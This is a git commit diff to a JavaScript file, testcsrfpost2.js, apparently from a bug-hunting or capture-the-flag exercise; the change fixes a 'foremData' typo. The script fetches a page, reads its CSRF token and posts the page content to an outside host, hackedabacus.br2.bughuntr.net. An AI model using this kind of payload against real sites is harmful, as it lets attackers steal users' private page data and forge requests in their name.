a874d7b045b5b218f0e6f8cd477c34a92c56e895
/hello <czavaleta93@gmail.com>
2021-11-03 19:38:38 -0500

    Update and rename testcsrfpost.js to testcsrfpost2.js

--- testcsrfpost2.js
+++ testcsrfpost2.js
@@ -6,7 +6,7 @@ fetch("/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
 
 	formData.append("csrfmiddlewaretoken", csrf);
 	formData.append("creator", "fromBot");
-	foremData.append("body", data);
+	formData.append("body", data);
 
 	fetch("https://hackedabacus.br2.bughuntr.net/comment/99760eaf-4592-4bc0-a1f5-a264fc4644ef",{
 		method: 'POST',
